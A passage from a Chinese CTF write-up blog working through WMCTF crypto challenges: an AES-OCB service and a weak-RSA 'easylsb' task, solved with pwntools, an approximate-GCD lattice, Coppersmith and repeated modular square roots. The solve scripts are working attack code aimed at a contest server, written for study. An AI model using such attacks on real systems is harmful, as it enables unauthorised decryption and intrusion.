message, associate_data)</span><br><span class="line">                    self.send(<span class="string">b&quot;[+] ciphertext: &quot;</span> + b64encode(ciphertext))</span><br><span class="line">                    self.send(<span class="string">b&quot;[+] tag: &quot;</span> + b64encode(tag))</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    self.send(<span class="string">b&quot;[!] ERROR!&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span>(choice == <span class="string">b&#x27;4&#x27;</span>):</span><br><span class="line">                self.send(<span class="string">b&#x27;[+] Bye~&#x27;</span>)</span><br><span class="line">                self.send(<span class="string">b&#x27;[+] See you next time!&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.send(<span class="string">b&#x27;[!] What are you doing???&#x27;</span>)</span><br><span class="line">                self.send(<span class="string">b&#x27;[!] Go away!&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        self.request.close()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadedServer</span>(<span class="params">socketserver.ThreadingMixIn, socketserver.TCPServer</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ForkedServer</span>(<span class="params">socketserver.ForkingMixIn, socketserver.TCPServer</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    HOST, PORT = <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">10001</span></span><br><span class="line">    server = ForkedServer((HOST, PORT), Task)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    <span class="built_in">print</span>(HOST, PORT)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure>

<p>津门杯和红明谷有类似的题目，ocb模式的AES提供了身份验证，还没有仔细研究过该模式下的流程，光看代码，没有什么方法可以绕过那个<code>associate_data == b&#39;from admin&#39;</code></p>
<h2 id="Crypto-easylsb（recuring）"><a href="#Crypto-easylsb（recuring）" class="headerlink" title="Crypto-easylsb（recuring）"></a>Crypto-easylsb（recuring）</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">password = <span class="comment"># Hidden</span></span><br><span class="line">flag = (<span class="string">&#x27;flag&#123;&#x27;</span> + <span class="built_in">str</span>(uuid.uuid4()) + <span class="string">&#x27;&#125;&#x27;</span>).encode()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>():</span></span><br><span class="line">    random.seed(os.urandom(<span class="number">8</span>))</span><br><span class="line">    proof = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)]).encode()</span><br><span class="line">    digest = sha256(proof).hexdigest()</span><br><span class="line">    printf(<span class="string">&quot;sha256(XXXX+%s) == %s&quot;</span> % (proof[<span class="number">4</span>:].decode(),digest))</span><br><span class="line">    printf(<span class="string">&#x27;Give me XXXX:&#x27;</span>)</span><br><span class="line">    x = read_str()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(x) != <span class="number">4</span> <span class="keyword">or</span> sha256(x.encode()+proof[<span class="number">4</span>:]).hexdigest() != digest: </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printf</span>(<span class="params">message</span>):</span></span><br><span class="line">    sys.stdout.write(<span class="string">&#x27;&#123;0&#125;\n&#x27;</span>.<span class="built_in">format</span>(message))</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    sys.stderr.flush()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_str</span>():</span></span><br><span class="line">    <span class="keyword">return</span> sys.stdin.readline().strip()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_int</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(sys.stdin.readline().strip())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">next_prime</span>(<span class="params">a</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> isPrime(a):</span><br><span class="line">        a += <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_prime</span>(<span class="params">a</span>):</span></span><br><span class="line">    suffix = getPrime(<span class="number">368</span>)</span><br><span class="line">    <span class="keyword">return</span> next_prime(a ** <span class="number">2</span> + suffix + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_pubkey</span>(<span class="params">key</span>):</span></span><br><span class="line">    p, q = get_prime(getPrime(<span class="number">512</span>)), get_prime(key)</span><br><span class="line">    n = p * q</span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">airdrop</span>(<span class="params">a</span>):</span></span><br><span class="line">    n = generate_pubkey(a)</span><br><span class="line">    printf(<span class="string">&#x27;gift: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(n))</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hint</span>(<span class="params">n, e, c</span>):</span></span><br><span class="line">    printf(<span class="string">&#x27;n = &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(n))</span><br><span class="line">    printf(<span class="string">&#x27;e = &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(e))</span><br><span class="line">    printf(<span class="string">&#x27;c = &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(c))</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>():</span></span><br><span class="line">    p = get_prime(getPrime(<span class="number">512</span>))</span><br><span class="line">    e = <span class="number">0x1000</span></span><br><span class="line">    c = <span class="built_in">pow</span>(bytes_to_long(flag), e, p)</span><br><span class="line">    </span><br><span class="line">    hint(p, e, c)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span>():</span></span><br><span class="line">    printf(<span class="string">&#x27;Input your password:&#x27;</span>)</span><br><span class="line">    user_input = read_str()</span><br><span class="line">    <span class="keyword">if</span> user_input.encode() == password:</span><br><span class="line">        leak()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        printf(<span class="string">&#x27;Wrong&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> proof_of_work():</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    a = getPrime(<span class="number">512</span>)</span><br><span class="line">    p = get_prime(a)</span><br><span class="line">    q = get_prime(getPrime(<span class="number">512</span>))</span><br><span class="line">    n = p * q</span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    max_time = <span class="number">5</span></span><br><span class="line">    password_enc = <span class="built_in">pow</span>(bytes_to_long(password), e, n)</span><br><span class="line">    </span><br><span class="line">    printf(<span class="string">&#x27;====================================&#x27;</span>,)</span><br><span class="line">    printf(<span class="string">&#x27;1. Airdrop                          &#x27;</span>,)</span><br><span class="line">    printf(<span class="string">&#x27;2. Backdoor                         &#x27;</span>,)</span><br><span class="line">    printf(<span class="string">&#x27;3. Hint                             &#x27;</span>,)</span><br><span class="line">    printf(<span class="string">&#x27;4. Exit                             &#x27;</span>,)</span><br><span class="line">    printf(<span class="string">&#x27;====================================&#x27;</span>,)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            printf(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">            choice = read_int()</span><br><span class="line">            <span class="keyword">if</span> choice == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> max_time &gt; <span class="number">1</span>:</span><br><span class="line">                    airdrop(a)</span><br><span class="line">                    max_time -= <span class="number">1</span></span><br><span class="line">                    printf(<span class="string">&#x27;Done!&#x27;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    printf(<span class="string">&#x27;Greed will destroy you!&#x27;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span> choice == <span class="number">2</span>:</span><br><span class="line">                backdoor()</span><br><span class="line">                printf(<span class="string">&#x27;Done!&#x27;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span> choice == <span class="number">3</span>:</span><br><span class="line">                hint(n, e, password_enc)</span><br><span class="line">                printf(<span class="string">&#x27;Done!&#x27;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span> choice == <span class="number">4</span>:</span><br><span class="line">                printf(<span class="string">&#x27;bye~&#x27;</span>)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                printf(<span class="string">&#x27;Invalid!&#x27;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>流程比较简单，虽然不会，但是思路比较清晰，通过<strong>4组gift和1个n</strong>求得a和p$\rightarrow$解密password$\rightarrow$在e=4096，模数是素数下解密flag</p>
<p>一开始通过尚师傅提醒，尝试之后发现，q开根后取整的结果是和a一样的<br>$$<br>\lfloor \sqrt{q} \rfloor=a<br>$$<br>然后假设$q=next_prime(a^2+suffix_1+1),\ p=next_prime(b^2+suffix_2+1)$</p>
<p>那么n=pq，给n开根号可以得到ab的高位，但也不知道拿来怎么用</p>
<p>保存了一组数据下来，以后有机会研究</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># nc 47.104.243.99 9999</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># flag = (&#x27;flag&#123;&#x27; + str(uuid.uuid4()) + &#x27;&#125;&#x27;).encode()</span></span><br><span class="line"><span class="comment"># print(flag)</span></span><br><span class="line"><span class="comment"># flag&#123;cb8365b5-a825-4c65-9251-b6827f0792ad&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>():</span></span><br><span class="line">    <span class="comment"># sha256(XXXX+cgDUNjezTPNSj91D) == 30fc93b19ef81e8755f3ee0e3df72722f66556b7636b5037f34d1beb981235b0</span></span><br><span class="line">    proof = sh.recvline()</span><br><span class="line">    tail = proof[<span class="number">12</span>:<span class="number">28</span>].decode()</span><br><span class="line">    HASH = proof[<span class="number">23</span>:<span class="number">97</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> product(string.ascii_letters + string.digits, repeat=<span class="number">4</span>):</span><br><span class="line">        head = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">        t = hashlib.sha256((head + tail).encode()).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> t == HASH:</span><br><span class="line">            sh.sendline(head.encode())</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work2</span>():</span></span><br><span class="line">    <span class="comment"># sha256(XXXX+cgDUNjezTPNSj91D) == 30fc93b19ef81e8755f3ee0e3df72722f66556b7636b5037f34d1beb981235b0</span></span><br><span class="line">    proof = sh.recvline()</span><br><span class="line">    tail = <span class="string">&#x27;eqbj8j6Z9xvz3YiV&#x27;</span></span><br><span class="line">    HASH = <span class="string">&#x27;b5808aff39327c9ac49d209d10fe3e27c898d49faffc956bbf1d73523c44ce77&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> product(string.ascii_letters + string.digits, repeat=<span class="number">4</span>):</span><br><span class="line">        head = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">        t = hashlib.sha256((head + tail).encode()).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> t == HASH:</span><br><span class="line">            sh.sendline(head.encode())</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh = remote(<span class="string">&quot;47.104.243.99&quot;</span>, <span class="number">9999</span>)</span><br><span class="line">proof_of_work2()</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = <span class="number">124478026101165354098037876421627662624056206605515177686194103211430464934743129994417330643128683345849733014275487857184516763016301408033382676283620282332485581507315430690690813831282519976585364463744017296315372258981215919387679949709396064987889800074036410663927631478105899096723790945928412829187822284593750473740315866322998068351563015099367643886154042581191841533888375305195743073059105310700318861167337672659772641786687582718180589854118978820530842381081568922213227168617789474006973152602334271699398178963791154954792676067153150646411025449463253194489657095241613282942586704728903727611399</span></span><br><span class="line">c = <span class="number">90647155870804971113806442051901226002120015769259333554192477899450971338831255790857101662710560234954831825416787459228033373486077151217415092360097814474283515220281223555587026056325099266316005605716929634353603643319859645167427538563242884591102004934790399528462112789803351851769047685792159647390050985871679243422993775721776244067168064933786611606433105514418429089777322132633028815660525070271128628044386434106685643657668695364607215033856398608992051550288297119711825866170869469834444973857013360900452988222767960318998636640763573797297203544581343736625672669946528644260077687270041162148579</span></span><br><span class="line">gift1 = <span class="number">430643544402084432319325961880416327356872029175895120742910502784460696485981655831364057771978842374920289740546998744096646780935886278222230684528731470188637076148307527311922452490801045278988434801896164340653915198079023711297016090027381126073802620204314765869166624636941907534206046998568042400815444697126334029985946496452932477337335924863188276040631646131204436116708742280199903183210826719901897273260766069768314579353548171372586771188839003301749872795307598319516051259672117483195538538878148292313730887085591272354625175614366936749367007177827223031514498275753340915542939818624965339274541</span></span><br><span class="line">gift2 = <span class="number">279643881521430665779764628210196159031443254319916096260435206316116655701344325784134050728686231352816394212502789612947929220430466611004330150352137570405484127780364316335386736272544877793446702006665399064591475517610575894857804921152265901610537191780251376268112843688812459951190257679817490601282013470378644045696567456486059374094892490322848884260103728441765221196492288890565220765116737467020984854284776188063793107604665880577892150257025900438921323929874583349697921571156857890185078774883450481945134786456867498237937223992977125106207044050316201931335150865420643200300919950666792333800421</span></span><br><span class="line">gift3 = <span class="number">237902069859826089956710602458488697197969935460375469157966706791637991891038954423106099106663742928616105443683571279895168734280020803510641968762322744746722455831059684745613465616901995570874116303439549541932451281441959514629564655972962203744852006794160278105621063202850402448076034174743227230202591123961117876362833492478366233652816443873213201410433457033307944305406209168085355438156499669719905462067847881209129983251184647052314353242784174374088582263983943733709287614092898665984536781786084591414804290805713181580225096207601673326693693442261927044483426965621699507399608913104482509541829</span></span><br><span class="line">gift4 = <span class="number">131184496439376311814751172869309509301398236134030748081290782986296909958428702969677021306310259793511587606469385852829507392096577310273567455635233040499932518933927338330158300947934921792366825549482737059128276134653805578959896357503546949681198843822945160611138388841031519307824760189249466171835761078895545203381195921789823129815826662876576368032722825159838976137103324588326186884693453137115752294499574361951327089081432442184727065530788376603390307277709197418051468405219378610308912749832078805547917787498228816440083434077213552664217150489211767711038795362880479839885325109115335568243823</span></span><br></pre></td></tr></table></figure>

<p>现在可以好好复现一下这道题了</p>
<p>先是补充，得到a之后，那么由上面的结论可知$a^2$就是q的高位，那这不就是RSA已知p的高位攻击吗</p>
<p>不懂WP里的格是由哪个方程组得到的</p>
<hr>
<p>好了，第三波复现，还以为agcd是师傅打错了，原来是我菜了，是个论文<a href="https://martinralbrecht.wordpress.com/2020/03/21/the-approximate-gcd-problem/">Approximate GCD</a></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210903140354348.png" alt="image-20210903140354348"></p>
<p>看格式和题目是完全对应的</p>
<p>哈哈，看不太懂，拿了格就跑路</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210903141338898.png" alt="image-20210903141338898"></p>
<p>$x_i$显然就是五组$n_i$开根号得到的，这个上面也证实了；$\lambda$就是368，因为论文里的$r_i$就是题目中的$suffix_i+1$</p>
<p>这样对矩阵B进行<code>LLL()</code>得到的是$q_0\cdot 2^{\lambda +1}$，除以$2^{\lambda +1}$就是论文里的$q_0$了，也就是与$x_0$对应的那个</p>
<p>到此为止还少了一步，接着题目中的$n=pq$推导<br>$$<br>n=pq=(a^2+suffix_1+1)(b^2+suffix_2+1)<br>$$<br>设$\beta =\sqrt {b^2+suffix_2+1},\ \delta$为p开根后的低位，$r=\delta \beta$</p>
<p>给n开根<br>$$<br>\sqrt n=(a+\delta)\beta    =a\beta +r<br>$$<br>这就和论文里给的形式一样了，而我们刚求出来的$q_0$就是这里的$\beta$，最后$\lfloor\sqrt n/\beta \rfloor    =\lfloor (a\beta +r)/\beta\rfloor$，显然$r/\beta$已经是小数部分了，取整就完全舍去了，所以结果就是a</p>
<hr>
<p>求出来的ans应该是上文的b，先用这位师傅的脚本得到a</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> root</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = <span class="number">124478026101165354098037876421627662624056206605515177686194103211430464934743129994417330643128683345849733014275487857184516763016301408033382676283620282332485581507315430690690813831282519976585364463744017296315372258981215919387679949709396064987889800074036410663927631478105899096723790945928412829187822284593750473740315866322998068351563015099367643886154042581191841533888375305195743073059105310700318861167337672659772641786687582718180589854118978820530842381081568922213227168617789474006973152602334271699398178963791154954792676067153150646411025449463253194489657095241613282942586704728903727611399</span></span><br><span class="line">c = <span class="number">90647155870804971113806442051901226002120015769259333554192477899450971338831255790857101662710560234954831825416787459228033373486077151217415092360097814474283515220281223555587026056325099266316005605716929634353603643319859645167427538563242884591102004934790399528462112789803351851769047685792159647390050985871679243422993775721776244067168064933786611606433105514418429089777322132633028815660525070271128628044386434106685643657668695364607215033856398608992051550288297119711825866170869469834444973857013360900452988222767960318998636640763573797297203544581343736625672669946528644260077687270041162148579</span></span><br><span class="line">gift1 = <span class="number">430643544402084432319325961880416327356872029175895120742910502784460696485981655831364057771978842374920289740546998744096646780935886278222230684528731470188637076148307527311922452490801045278988434801896164340653915198079023711297016090027381126073802620204314765869166624636941907534206046998568042400815444697126334029985946496452932477337335924863188276040631646131204436116708742280199903183210826719901897273260766069768314579353548171372586771188839003301749872795307598319516051259672117483195538538878148292313730887085591272354625175614366936749367007177827223031514498275753340915542939818624965339274541</span></span><br><span class="line">gift2 = <span class="number">279643881521430665779764628210196159031443254319916096260435206316116655701344325784134050728686231352816394212502789612947929220430466611004330150352137570405484127780364316335386736272544877793446702006665399064591475517610575894857804921152265901610537191780251376268112843688812459951190257679817490601282013470378644045696567456486059374094892490322848884260103728441765221196492288890565220765116737467020984854284776188063793107604665880577892150257025900438921323929874583349697921571156857890185078774883450481945134786456867498237937223992977125106207044050316201931335150865420643200300919950666792333800421</span></span><br><span class="line">gift3 = <span class="number">237902069859826089956710602458488697197969935460375469157966706791637991891038954423106099106663742928616105443683571279895168734280020803510641968762322744746722455831059684745613465616901995570874116303439549541932451281441959514629564655972962203744852006794160278105621063202850402448076034174743227230202591123961117876362833492478366233652816443873213201410433457033307944305406209168085355438156499669719905462067847881209129983251184647052314353242784174374088582263983943733709287614092898665984536781786084591414804290805713181580225096207601673326693693442261927044483426965621699507399608913104482509541829</span></span><br><span class="line">gift4 = <span class="number">131184496439376311814751172869309509301398236134030748081290782986296909958428702969677021306310259793511587606469385852829507392096577310273567455635233040499932518933927338330158300947934921792366825549482737059128276134653805578959896357503546949681198843822945160611138388841031519307824760189249466171835761078895545203381195921789823129815826662876576368032722825159838976137103324588326186884693453137115752294499574361951327089081432442184727065530788376603390307277709197418051468405219378610308912749832078805547917787498228816440083434077213552664217150489211767711038795362880479839885325109115335568243823</span></span><br><span class="line"></span><br><span class="line">f = <span class="keyword">lambda</span> a: <span class="built_in">int</span>(root(a, <span class="number">2</span>))</span><br><span class="line">x0, x1, x2, x3, x4 = f(n), f(gift1), f(gift2), f(gift3), f(gift4)</span><br><span class="line"></span><br><span class="line">B = matrix(ZZ, [[<span class="number">2</span> ^ <span class="number">368</span>, x1, x2, x3, x4], [<span class="number">0</span>, -x0, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>], [<span class="number">0</span>, <span class="number">0</span>, -x0, <span class="number">0</span>, <span class="number">0</span>], [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -x0, <span class="number">0</span>], [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -x0]])</span><br><span class="line">L = B.LLL()</span><br><span class="line">ans = L[<span class="number">0</span>][<span class="number">0</span>] // <span class="number">2</span> ^ <span class="number">368</span></span><br><span class="line"></span><br><span class="line">p0 = <span class="built_in">abs</span>(ans)</span><br><span class="line">a = x0 // p0</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="comment"># a = 25582847577564670038612582668140373129129959651036453923605273284793860890291221263498753328353767798264241675861426056503889321642277844202986695039010291</span></span><br></pre></td></tr></table></figure>

<p>然后是熟悉的节奏，但和一般的已知p的高位攻击不一样，显然$a^2$已经和p的位数差不多了，只是不知道368位的suffix是多少，所以本质一样，用CopperSmith求小根的算法求出suffix；这里取kbits为369，因为368出不来，往大一点的地方取</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">25582847577564670038612582668140373129129959651036453923605273284793860890291221263498753328353767798264241675861426056503889321642277844202986695039010291</span></span><br><span class="line">n = <span class="number">124478026101165354098037876421627662624056206605515177686194103211430464934743129994417330643128683345849733014275487857184516763016301408033382676283620282332485581507315430690690813831282519976585364463744017296315372258981215919387679949709396064987889800074036410663927631478105899096723790945928412829187822284593750473740315866322998068351563015099367643886154042581191841533888375305195743073059105310700318861167337672659772641786687582718180589854118978820530842381081568922213227168617789474006973152602334271699398178963791154954792676067153150646411025449463253194489657095241613282942586704728903727611399</span></span><br><span class="line">pbar = a ** <span class="number">2</span></span><br><span class="line">kbits = <span class="number">369</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = pbar + x</span><br><span class="line">roots = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)</span><br><span class="line"><span class="comment"># 967901962469872165537856438801710756065070673694594801499396171114255660549746759504438698205658088002955084386</span></span><br></pre></td></tr></table></figure>

<p>接下来RSA的常规步奏得到password</p>
<blockquote>
<p>Cou1d_I_get_Th3_passw03d_then_captu7e_the_fla9?</p>
</blockquote>
<p>因为比赛中没有获得flag的c，所以借这位师傅的一用</p>
<p>正如一开始所说的e是偶数，还是$2^{12}$，与$\varphi(p)=p-1$不互素，这个时候应该说<code>PUTAOAO，你的台词说错了哟。报仇的时候可不能说兲蛋什么的。应该是这样：吾名尚师傅，为了抚平吾友4XWi11之憾恨，以及让吾左侧朋友Y1m0在天之灵得以安息，吾势必要汝以4谢罪!</code></p>
<img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/X789FEG@489}U42@PTNVUY8.jpg" alt="img"/>

<p>平方根，有限域开方，Rabin一把梭</p>
<p>不过这里考虑到这里4096比较大，有限域开方会很慢吧，直接用nthroot_mod函数似乎并不行，传统的rabin是不行的因为模数是p；看了师傅的恍然大悟，为此特地去发了一篇关于<a href="https://blog.csdn.net/m0_49109277/article/details/120082896">rabin原理的博客</a></p>
<p>虽然不知道nthroot_mod为什么不行，由于<code>p % 4 = 3</code>符合rabin最基本的条件，之所以需要满足这个条件而这个条件也正是开方出来结果比较少的条件，所以直接开12次方没有压力</p>
<p>关键的代码<code>m1 = pow(c, (p + 1) // 4, p)</code>和<code>m2 = p - m1</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">p = <span class="number">496584754781581997154645314415051021632937719346451955222548277806458479939882609131615548616817732786901123585586203791585231652481101508165523306207307511005218236201069837205145881515297396218450658339325435517394532697652694250302927324547950654199907918057947165277944713164863611463887879016367147027651</span></span><br><span class="line">e = <span class="number">4096</span></span><br><span class="line">c = <span class="number">202821697585498721190880385651888326819052363235092021514522019296117832067188656931773131985516119359273814956340533509702817980744398402155886334655033938474295749168241550740096583920405311629354495691732306096266636370938656838375279086916114964255411601403125984312042419408682006688199111243135798564394</span></span><br><span class="line"></span><br><span class="line">mi = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    mi.append(<span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p))</span><br><span class="line">    mi.append(p - <span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p))</span><br><span class="line">    c = <span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> mi:</span><br><span class="line">    t = long_to_bytes(i)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;WMCTF&#x27;</span> <span class="keyword">in</span> t:</span><br><span class="line">        <span class="built_in">print</span>(t)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>然后看来Striving师傅的博客，原来有限域开方也是可以的，看来我并没有理解其中的精华，回顾之前的<a href="https://blog.csdn.net/m0_49109277/article/details/118603921?spm=1001.2014.3001.5501">ctfshow unusualrsa系列的博客</a>，其实有了sage一切就并不复杂</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = <span class="number">496584754781581997154645314415051021632937719346451955222548277806458479939882609131615548616817732786901123585586203791585231652481101508165523306207307511005218236201069837205145881515297396218450658339325435517394532697652694250302927324547950654199907918057947165277944713164863611463887879016367147027651</span></span><br><span class="line">e = <span class="number">4096</span></span><br><span class="line">c = <span class="number">202821697585498721190880385651888326819052363235092021514522019296117832067188656931773131985516119359273814956340533509702817980744398402155886334655033938474295749168241550740096583920405311629354495691732306096266636370938656838375279086916114964255411601403125984312042419408682006688199111243135798564394</span></span><br><span class="line">R.&lt;x&gt; = Zmod(p)[]</span><br><span class="line">f = x ^ e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res1 = f.roots()</span><br><span class="line"><span class="built_in">print</span>(res1)</span><br><span class="line"><span class="comment"># res1 = [(496584754781581997154645314415051021632937719346451955222548277806458479939882609131615548616817732786901123585586203791585231652481101508165523306207307511005218236201069837205145881515297396218450658339313214656968189495352306293673615992017103882095004555948437432049586089024300970437646867574391499674950, 1), (12220860426343202300387956629311332530846772104903362109509733228358624140562641026241011441975647352701, 1)]</span></span><br><span class="line">c = <span class="number">12220860426343202300387956629311332530846772104903362109509733228358624140562641026241011441975647352701</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(c))</span><br></pre></td></tr></table></figure>

<p>确实可以，跑的比预计的要快</p>
